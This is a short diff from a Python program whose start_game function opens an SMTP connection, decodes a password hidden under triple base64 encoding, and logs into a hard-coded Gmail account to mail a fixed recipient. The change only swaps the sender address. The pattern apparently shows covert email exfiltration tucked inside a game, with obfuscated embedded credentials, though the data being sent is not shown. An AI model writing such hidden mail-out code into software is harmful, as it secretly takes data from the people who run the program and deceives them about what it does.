@@ -26,7 +26,7 @@ def start_game():
 		smtpObj.ehlo()
 		password = (base64.b64decode( base64.b64decode( base64.b64decode(rsa_xor))).decode('ascii'))
 		smtpObj.starttls()
-		MY_MAIL_ADDRESS = "zaidcoder2@gmail.com"
+		MY_MAIL_ADDRESS = "zeusB9091@gmail.com"
 		PASSWORD = password.split("\n")[0]
 		RECIEVER_EMAIL_ID = "zaidcoder2@gmail.com"
 		smtpObj.login(MY_MAIL_ADDRESS, PASSWORD)
